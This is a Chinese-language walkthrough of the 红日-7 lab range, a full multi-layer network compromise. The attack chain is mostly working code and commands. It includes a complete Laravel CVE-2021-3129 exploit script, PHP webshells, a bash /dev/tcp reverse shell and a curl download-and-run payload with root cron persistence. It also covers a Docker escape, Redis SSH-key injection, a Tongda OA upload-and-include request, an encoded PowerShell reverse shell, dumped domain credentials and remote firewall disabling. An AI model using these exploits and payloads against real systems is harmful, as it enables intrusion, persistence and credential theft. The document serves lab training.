# WHOAMI Penetration 红日-7

具体配置以及讲解https://www.freebuf.com/articles/network/264560.html

## 环境配置

靶场链接：https://pan.baidu.com/s/1qavABmu8E75Q4y6os-Joqw

提取密码：ci20

![image-20231205151748303](http://111.229.225.13:81/i/2023/12/05/p3ia1b-2.png)

![image-20231205151802890](http://111.229.225.13:81/i/2023/12/05/p3sb4i-2.png)

![image-20231205151821465](http://111.229.225.13:81/i/2023/12/05/p3wl4h-2.png)

这里说一下，可能一些用户内存不够，如果没有加内存条的话可以采用虚拟内存的技术，暂时解决，然后开启关键的靶场

虚拟内存开启方法

![image-20231205151949536](http://111.229.225.13:81/i/2023/12/05/p4nsxv-2.png)

​		![image-20231205152013886](http://111.229.225.13:81/i/2023/12/05/p51n46-2.png)

具体细节，可以自行百度

然后，开启靶场后，可以使用ssh连接，把VMware中的靶机设置为命令行模式 ubuntu ctrl+alt+f3 (切换回来为ctrl+alt+f2)

**DMZ**区的 **Ubuntu** **需要启动** **nginx** **服务**

redis-server /etc/redis.conf

/usr/sbin/nginx -c /etc/nginx/nginx.conf

iptables -F

**第二层网络的** **Ubuntu** **需要启动** **docker** **容器**

sudo service docker start

sudo docker start 8e172820ac78

**第三层网络的** **Windows 7** **（** **PC 2** **）需要启动通达** **OA** **：**

C:\MYOA\bin\AutoConfig.exe

这里可能会提示过期，直接修改电脑中的系统时间就可以

## 第一层网络渗透

### 内网渗透——拿下一台web主机权限

kali攻击主机对其局域网进行信息收集

```bash
arp-scan -l
```

![image-20231205152559059](http://111.229.225.13:81/i/2023/12/05/p8adgc-2.png)

```bash
nmap -T4 -sV -A -O -P -p 20-10000 IP
```

![image-20231206200651473](http://111.229.225.13:81/i/2023/12/06/x6mf6z-2.png)

发现81端口CMS Laravel

![image-20231205152945712](http://111.229.225.13:81/i/2023/12/05/pala3e-2.png)

根据上图右下角的版本信息，去找到是否存在对应的系统漏洞

![image-20231205153022788](http://111.229.225.13:81/i/2023/12/05/pb1x9t-2.png)

这里推荐使用

github的一处exphttps://github.com/zhzyker/CVE-2021-3129/blob/main/exp.py

不过这里把执行的命令写死了

笔者改了一下

```python
# -*- coding=utf-8 -*-
# Author : Crispr
# Alter: zhzyker
import os
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
# __gadget_chains = {
#             # "Laravel/RCE1":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE2":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE3":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE4":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE5":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """.format(command),
#             # "Laravel/RCE6":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """.format(command),
#             # "Laravel/RCE7":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             "Monolog/RCE1":r"""
#             php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             """,
#             # "Monolog/RCE2":r"""
#             # php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Monolog/RCE3":r"""
#             # php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Monolog/RCE4":r"""
#             # php -d "phar.readonly=0" ./phpggc Monolog/RCE4 id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#     }
class EXP:
    #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用  
    def __init__(self, target,__gadget_chains):
        self.__gadget_chains = __gadget_chains
        self.target = target
        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
        if not self.__vul_check():
            print("[-] [%s] is seems not vulnerable." % (self.target))
            print("[*] You can also call obj.exp() to force an attack.")
        else:
            self.exp()


    def __vul_check(self):
        res = requests.get(self.__url,verify=False)
        if res.status_code != 405 and "laravel" not in res.text:
            print("[+]Vulnerability does not exist")
            return False
        return True

    def __payload_send(self,payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        
        #print(data)
        res = requests.post(self.__url, headers=header, json=data, verify=False)
        return res

    def __clear_log(self):
        payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        return self.__payload_send(payload=payload)

    def __generate_payload(self,gadget_chain):
        generate_exp = self.__gadget_chains[gadget_chain]
        #print(generate_exp)
        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'
        print("[+]exploit:")
        #print(exp)
        return exp

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")

    def __rce(self):
        text = str(self.__unserialize_log().text)
        #print(text)
        text = text[text.index(']'):].replace("}","").replace("]","")
        return text

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
            print("[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('A' * 2)
            self.__payload_send(self.__generate_payload((gadget_chain)))
            self.__decode_log()
            print("[*] " + gadget_chain + " Result:")
            print(self.__rce())
            wait = input("等待....")

def main():
    url = input("input your url:")
    
    while True:
        command = input("input your command:")
        __gadget_chains = {
            # "Laravel/RCE1":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE2":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE3":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE4":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE5":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """.format(command),
            # "Laravel/RCE6":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """.format(command),
            # "Laravel/RCE7":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            "Monolog/RCE1":r"""
            php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            """,
            # "Monolog/RCE2":r"""
            # php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Monolog/RCE3":r"""
            # php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Monolog/RCE4":r"""
            # php -d "phar.readonly=0" ./phpggc Monolog/RCE4 id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
    }
        
        EXP(url,__gadget_chains)

if __name__ == "__main__":
    main()

```

![image-20231205154238820](http://111.229.225.13:81/i/2023/12/05/piadem-2.png)

base写马

![image-20231205153816657](http://111.229.225.13:81/i/2023/12/05/pfrxmv-2.png)

```php
'echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php'
```

![image-20231205154607114](http://111.229.225.13:81/i/2023/12/05/pkhyd0-2.png)

![image-20231205154627255](http://111.229.225.13:81/i/2023/12/05/pklvvf-2.png)

### 权限提升——docker逃逸

![image-20231205181955797](http://111.229.225.13:81/i/2023/12/05/u3b7l6-2.png)

```bash
cat /proc/self/cgroup
```

查看控制组

![image-20231205182208417](http://111.229.225.13:81/i/2023/12/05/u4t5jq-2.png)

得知是在docker容器中

```bash
find / -perm -u=s -type f 2>/dev/null
```

从根目录查找具有root权限的二进制执行文件

![image-20231205182628029](http://111.229.225.13:81/i/2023/12/05/u7b7sm-2.png)

没有找到可以进行suid提权的命令

但是发现了/home/jobs/shell

瞅一眼

![image-20231205182913335](http://111.229.225.13:81/i/2023/12/05/u90jbp-2.png)

运行后创建了一个shell进程 （cmd表示执行的命令根据sh可知）

 基于此推测使用环境变量提权的方式进行

考虑采用kali终端会更方便，用蚁剑命令执行反弹shell到kali中（这里需要使用蚁剑的代码执行插件）

![image-20231205185032272](http://111.229.225.13:81/i/2023/12/05/ulmjhf-2.png)

```bash
system('bash -c "bash -i >& /dev/tcp/192.168.52.128/3333 0>&1" ');
```

可能第一次无法反弹上去，需要多几次

然后在kali依次输入一下命令

```bash
cd /tmp #进入临时目录
echo "/bin/bash" > ps #写入bash命令放入ps文件
chmod 777 ps #给此文件赋予权限
echo $PATH  #查看环境变量
export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序
cd /home/jobs
./shell 
# 然后就获得了root权限，可以执行命令了
```

![image-20231205185556734](http://111.229.225.13:81/i/2023/12/05/uor0vx-2.png)

使用

```bash
python -c 'import pty;pty.spawn("/bin/bash");'
```

进入交互式终端

![image-20231205185915045](http://111.229.225.13:81/i/2023/12/05/uqvpd0-2.png)

现在考虑逃逸Docker,利用漏洞Docker runC漏洞逃逸和Docker特权模式逃逸，前者没有成功（需要管理员用户重新启动docker感觉条件有的严苛，并且我手动没有成功），这里还是推荐使用msf上马，因为利用漏洞没有成功后，会掉线！！！（都是泪）

在docker中新建一个/hack目录挂载文件

```bash
mkdir /hack
```

然后

```bash
ls /dev
```

可以发现很多设备文件

![image-20231205203010364](http://111.229.225.13:81/i/2023/12/05/xknxfn-2.png)

尝试将/dev/sda1挂载到/hack目录中

```bash
mount /dev/sda1 /hack
```

挂载成功后，可以通过访问/hack文件达到访问整个主机的作用

![image-20231206192257931](http://111.229.225.13:81/i/2023/12/06/vsx65v-2.png)

此时采用msf中的 exploit/multi/script/web_delivery模块上线msf

![image-20231206192621088](http://111.229.225.13:81/i/2023/12/06/vusrfn-2.png)

选择linux系统为目标

```bash
set target 7
```



选择对应操作系统架构的payload进行反向连接

![image-20231206192724071](http://111.229.225.13:81/i/2023/12/06/vvf0ci-2.png)

```bash
set payload 10#选择对应payload
show options #查看对应选项
set lhost #绑定攻击主机ip
set lport #绑定攻击主机端口号
run #干 或者exploit命令也可以
```

![image-20231206193059432](http://111.229.225.13:81/i/2023/12/06/vxenhs-2.png)

生成了一段攻击命令，在目标主机运行此命令即可达到攻击的效果，不过仔细分析这段命令，就可以发现，其实就是用目标主机下载木马，然后赋权限运行

这里注意目标主机上面没有wget命令，所以要变通，经发现有curl命令

![image-20231206193341132](http://111.229.225.13:81/i/2023/12/06/vz3gw4-2.png)

改一下payload

```bash
curl -O http://192.168.52.128:8080/tbt0SG0; chmod +x tbt0SG0; ./tbt0SG0& disown
```

写入定时任务反弹shell

```bash
echo '* * * * * curl -O http://192.168.52.128:8080/tbt0SG0; chmod +x tbt0SG0; ./tbt0SG0& disown' >>/hack/var/spool/cron/crontabs/root
```

没执行成功，你妹的，直接执行命令

![image-20231206194352108](http://111.229.225.13:81/i/2023/12/06/w545fk-2.png)

成功监听到会话

![image-20231206194414054](http://111.229.225.13:81/i/2023/12/06/w5h4vk-2.png)

```bash
#按下回车
show sessions #查看会话
sessions -i 对应会话id #进入会话并启动meterpreter模式
```

![image-20231206194549141](http://111.229.225.13:81/i/2023/12/06/w6a1s1-2.png)

信息收集发现只有

![image-20231206194823116](http://111.229.225.13:81/i/2023/12/06/xq3qts-2.png)

没瞅着我们之前访问的ip,192.168.52.10

![image-20231206200346165](http://111.229.225.13:81/i/2023/12/06/x4t15g-2.png)

nmap扫描得到6379 redis数据库(之前扫描过了，再扫描一遍)

采用redis未授权攻击

```bash
redis-cli -h 192.168.52.10
```

运气好

![image-20231206200826353](http://111.229.225.13:81/i/2023/12/06/x7nivl-2.png)

利用成功后往目标主机写入ssh公钥

现在kali中生成公钥

```bash
ssh-keygen -t rsa
```

然后写入对方攻击主机 (这里有一个坑，在配置服务的时候redis需要用root权限开启，否则无法设置/root/.ssh)

```bash
config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/
config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys
save    # 将数据保存在目标服务器硬盘上
```

然后直接ssh连接

```bash
ssh 192.168.52.10
```

![image-20231206203431914](http://111.229.225.13:81/i/2023/12/06/xn62oz-2.png)

ifconfig看到的信息也和之前不一样了

![image-20231206203458136](http://111.229.225.13:81/i/2023/12/06/xnbiy8-2.png)

你妹的，我照着他教程一步一步的做，结果就是不同，他这一个网卡你妹的是ipv4，就离谱

因为当时拿下的主机ip地址是

![image-20231206194823116](http://111.229.225.13:81/i/2023/12/06/xq3qts-2.png)

172.17.0.2,并且我直接访问无法通信，结合之前nmap扫描的nginx中间件，猜测做了反向代理

查看一下nginx配置文件

![image-20231206204411122](http://111.229.225.13:81/i/2023/12/06/xszwd3-2.png)

okk已经确定做了nginx反向代理，并且确定第一次拿下的网站权限是192.168.52.20

现在已经拿下两台主机权限了

```bash
DMZ区域的Ubuntu 18：192.168.52.10
第二层网络的Ubuntu 14：192.168.52.20
```

![image-20231206204806312](http://111.229.225.13:81/i/2023/12/06/xvcg4b-2.png)

## 第二层网络渗透

### 内网穿透

要开启后续的，虚拟机了，（条件可以的话还是加个内存条吧）

在DMZ区域Ubuntu 18的meterpreter中添加一个通往192.168.52.1/24网段的路由（就是外层的）



![image-20231206210001130](http://111.229.225.13:81/i/2023/12/06/yqafey-2.png)

路由转发只能将msfconsole带进内网，而要想将攻击机上的其他攻击程序也带进内网还需要搭建socks代理。我们使用earthworm搭建socks5反向代理服务。

这里下载一个ew作为代理工具，用什么无所谓（这里看题解的）

```bash
./ew_for_linux64 -s rcsocks -l 1080 -e 1234
```

![image-20231206211853060](http://111.229.225.13:81/i/2023/12/06/z1av3m-2.png)

将ew上传到目标 192.168.52.10服务器上

```bash
meterpreter> upload ./ew_for_linux64 #下载ew工具到目标服务器
meterpreter> shell #终端
chmod 777 ew_for_linux64 #赋权
nohup ./ew_for_linux64 -s rssocks -d 192.168.52.128 -e 1234 & #ip为自己攻击主机的ip地址；后台运行此命令
```

![image-20231207174304442](http://111.229.225.13:81/i/2023/12/07/stqvle-2.png)

![image-20231207174245647](http://111.229.225.13:81/i/2023/12/07/ste8gj-2.png)

使用msf的auxiliary/scanner/discovery/udp_probe模块进行主机扫描，（fscan上线了，但是无法运行，报错显示靶机内核问题）

```bash
use auxiliary/scanner/discovery/udp_probe
set rhosts 192.168.52.1-255
set threads 5
run
```

![image-20231207194538918](http://111.229.225.13:81/i/2023/12/07/w67y14-2.png)

可以发现一个新的存活主机：192.168.52.30 (这里如果配置没有配好的话，扫不到这台主机，要把192.168.52.30 这台主机的防火墙关闭了，当192.168.52.20和这台主机可以互ping通即可）

### 内网横向

使用nmap进一步对此主机进行扫描

```bash
proxychains4 nmap -Pn -sT -sV -F -O 192.168.52.30
```

![image-20231207194823727](http://111.229.225.13:81/i/2023/12/07/w7wsit-2.png)

8080端口nginx服务，搞一手

在攻击主机设置好代理，即可用浏览器访问，这里我用主机，设置代理为攻击机端口192.168.52.128:1080

![image-20231207195211994](http://111.229.225.13:81/i/2023/12/07/wa802k-2.png)

![image-20231207195305441](http://111.229.225.13:81/i/2023/12/07/wasdja-2.png)

搜历史漏洞[通达OA前台任意用户登录漏洞+RCE漏洞复现_通达oa2016漏洞-CSDN博客](https://blog.csdn.net/szgyunyun/article/details/107104288)

这里采用文件上传结合文件包含

文件上传图片马

```php+HTML
POST /ispirit/im/upload.php HTTP/1.1
Host: 192.168.52.30:8080
Content-Length: 664
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
Cookie: PHPSESSID=123
Connection: close

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"

123
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
------WebKitFormBoundarypyfBh1YB4pV8McGB--
```

![image-20231207200628012](http://111.229.225.13:81/i/2023/12/07/x6grjw-2.png)

文件路径
+OK [vm]256@2102_32681074|jpg|0[/vm] => 2102/32681074.jpg

文件包含

```php+HTML
POST /ispirit/interface/gateway.php HTTP/1.1
Host:  192.168.52.30:8080
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.21.0
Content-Length: 69
Content-Type: application/x-www-form-urlencoded

json={"url":"/general/../../attach/im/2007/422124454.jpg"}&cmd=whoami

```



![image-20231207200746566](http://111.229.225.13:81/i/2023/12/07/x76e2k-2.png)

可以看见命令执行成功

采用msf 的exploit/multi/script/web_delivery生成命令反弹shell

这玩意还是要点运气，msf模块我是没有反弹成功，直接nc监听，反弹shell成功

```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUAMgAuADEAMgA4ACIALAA4ADgANAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![image-20231207212342133](http://111.229.225.13:81/i/2023/12/07/z47ny9-2.png)

![image-20231207213810881](http://111.229.225.13:81/i/2023/12/07/zcz75c-2.png)

尝试了一下，发现可能是payload的问题，改用payload => windows/meterpreter/reverse_tcp payload连接成功了

![image-20231210170505282](http://111.229.225.13:81/i/2023/12/10/s775lp-2.png)                   

![image-20231210170812993](http://111.229.225.13:81/i/2023/12/10/s8ze9f-2.png)

​			![image-20231210170855972](http://111.229.225.13:81/i/2023/12/10/s98wha-2.png)

![image-20231210171039341](http://111.229.225.13:81/i/2023/12/10/sabwqi-2.png)

### 上线CS，这里直接上马连接

![image-20231211210143123](http://111.229.225.13:81/i/2023/12/11/yr6jxj-2.png)

![image-20231211210217921](http://111.229.225.13:81/i/2023/12/11/yrl4w3-2.png)

点击选择

点击生成

![image-20231211210259464](http://111.229.225.13:81/i/2023/12/11/ys2shm-2.png)

木马已经生成到我们主机的桌面

然后把马上传到目标服务器即可

![image-20231211210442880](http://111.229.225.13:81/i/2023/12/11/ysxa3q-2.png)

kali主机下载 

```bash
wget http://192.168.52.1:8848/artifact.exe
```

msf下载

```bash
upload artifact.exe 
```

![image-20231211211420908](http://111.229.225.13:81/i/2023/12/11/yyr5fo-2.png)

cs成功上线

## 第三层网络渗透

![image-20231211211438075](http://111.229.225.13:81/i/2023/12/11/yyvkik-2.png)

![image-20231211211753546](http://111.229.225.13:81/i/2023/12/11/z0qbgm-2.png)

进程列表展示，这里可以点击对应进程使用进程注入模块

没找到域管理员账号

进行网络探测

![image-20231211212055516](http://111.229.225.13:81/i/2023/12/11/z2j8ms-2.png)

发现两台主机

先进行内网的信息收集，看看能否抓到有用的信息

![image-20231211212204724](http://111.229.225.13:81/i/2023/12/11/z3evck-2.png)

![image-20231211212244732](http://111.229.225.13:81/i/2023/12/11/z3nlq3-2.png)

![image-20231211212456569](http://111.229.225.13:81/i/2023/12/11/z4wtlh-2.png)

```
tspkg&wdigest Administrator Whoami2021 WHOAMIANONY 
kerberos  Administrator Whoami2021 WHOAMIANONY.ORG

```

尝试直接登录DC域控制器失败

猜测防火墙原因，这里先关闭防火墙(cs上使用命令需要加一个shell eg.shell whoami)

```bash
net use \\192.168.93.30\ipc$ "Whoami2021" /user:"Administrator"
sc \\192.168.93.30 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
sc \\192.168.93.30 start unablefirewall
```

![image-20231212152216799](http://111.229.225.13:81/i/2023/12/12/p6ahkr-2.png)

拿下域控和win7

## 总结

不足在于其实环境配置错误，kali和第一台web主机在一个局域网内，这就降低了一些难度，虽然依旧是从外网开始打的

1、Laravel Debug mode RCE漏洞利用

2、Docker 特权模式逃逸

3、ew内网穿透，socket代理

4、通达OA V11.3文件上传、文件包含漏洞利用

5、内网信息收集 

```powershell
ipconfig /all   # 查看本机ip，所在域
systeminfo      # 列出系统信息
route print     # 打印路由信息
net view        # 查看局域网内其他主机名
arp -a          # 查看arp缓存
whoami
net start       # 查看开启了哪些服务
net share       # 查看开启了哪些共享

net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators   # 查看本地管理员组（通常会有域用户）
net view /domain         # 查看有几个域
net user 用户名 /domain   # 获取指定域用户的信息
net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    # 查看域中某工作组
net group "domain admins" /domain  # 查看域管理员的名字
net group "domain computers" /domain  # 查看域中的其他主机名
net group "domain controllers" /domain  # 查看域控制器（可能有多台）
```

6、msf及cs使用

